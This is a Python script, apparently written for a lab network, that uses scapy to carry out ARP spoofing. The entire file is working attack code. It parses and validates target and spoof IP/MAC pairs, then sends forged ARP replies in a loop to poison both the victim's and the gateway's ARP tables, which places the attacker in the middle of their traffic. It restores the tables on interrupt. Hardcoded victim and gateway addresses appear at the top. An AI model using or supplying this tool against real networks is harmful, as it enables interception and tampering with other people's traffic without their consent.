import scapy.all as scapy
import time
import argparse
import re


victimIP="172.18.0.2"
victimMAC="02:42:ac:12:00:02"
gatewayIP="172.18.0.4"
gatewayMAC="02:42:48:76:cb:d3"

def spoof(targetIP,targetMAC,spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(targetIP,targetMAC,goodIP,goodMAC):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=goodIP, hwsrc=goodMAC)
    scapy.send(packet, verbose=False)

def parse_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofing Argument Parser")
    parser.add_argument("-t", "--target", dest="target", required=True, help="IP and MAC address of the target (Format: IP,MAC)")
    parser.add_argument("-s", "--spoof", dest="spoof", required=True, help="IP and MAC address to be spoofed (Format: IP,MAC)")
    args = parser.parse_args()
    if not args.target or not args.spoof:
        print("Introduce an argument")
        parser.print_help()
        exit(1)
    return args

def validate_ip_address(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None

def validate_mac_address(mac):
    pattern = re.compile(r"^(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")
    return pattern.match(mac) is not None

def main():
    args = parse_arguments()

    # Extraer IP y MAC de destino
    target_parts = args.target.split(",")
    clientIP = target_parts[0]
    clientMAC = target_parts[1]

    # Extraer IP y MAC a spoofear
    spoof_parts = args.spoof.split(",")
    serverIP = spoof_parts[0]
    serverMAC = spoof_parts[1]

    # Validar direcciones IP y MAC
    if not validate_ip_address(clientIP):
        print("Error: Invalid target IP address.")
        exit()
    if not validate_mac_address(clientMAC):
        print("Error: Invalid target MAC address.")
        exit()
    if not validate_ip_address(serverIP):
        print("Error: Invalid spoof IP address.")
        exit()
    if not validate_mac_address(serverMAC):
        print("Error: Invalid spoof MAC address.")
        exit()
    
    try:
        print("Spoofing gateway and victim ARP tables")
        while True:
            spoof(clientIP,clientMAC,serverIP)
            spoof(serverIP,serverMAC,clientIP)
            time.sleep(0.2)
    except KeyboardInterrupt:
        print("Restoring arp tables")
        restore(clientIP,clientMAC,serverIP,serverMAC)
        restore(serverIP,serverMAC,clientIP,clientMAC)    

if __name__ == '__main__':
    main()